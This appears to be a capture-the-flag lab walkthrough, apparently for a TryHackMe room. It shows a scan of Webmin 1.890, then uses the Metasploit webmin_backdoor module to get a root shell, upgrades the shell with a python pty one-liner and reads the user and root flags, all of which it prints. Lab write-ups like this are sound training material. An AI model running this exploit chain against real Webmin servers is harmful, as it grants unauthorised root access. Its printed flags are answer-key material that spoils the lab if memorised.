---
Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.
---

### rustscan

> 10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)

### metasploit

```
msfconsole -q
```

> There are several exploits that will require valid credentials, that we don’t have. Let’s use the webmin_backdoor exploit, which does not require credentials. 

```
use 5
```

```
show options
```
*Now, let’s set up a couple of mandatory variables, and run the exploit. *

> SSL **Es el acrónimo de Secure Sockets Layer, capa de sockets seguros**. Protocolo para navegadores web y servidores que permite la autenticación, encriptación y desencriptación de datos enviados a través de Internet.
```
set rhost *machine-ip*
```

```
set ssl true
```

```
set rport 10000
```

```
set lhost *vpn-ip*
```

```
run
```

*This exploit directly gives us a privileged shell and we don’t even need a privesc*
```root
whoami
```

```
which python
```

```
python -c "import pty;pty.spawn('/bin/bash')"
```

> root@source:/usr/share/webmin/# 

```
ls -l /home
```

```
cat /home/dark/user.txt
```

==THM{SUPPLY_CHAIN_COMPROMISE}==

```
cat /root/root.txt
```

==THM{UPDATE_YOUR_INSTALL}==

> Se denomina Supply Chain o cadena de abastecimiento al proceso que se comprende desde la realización de un pedido por parte del cliente, hasta que el producto o servicio ha sido entregado


- user.txt *THM{SUPPLY_CHAIN_COMPROMISE}*
- root.txt *THM{UPDATE_YOUR_INSTALL}*

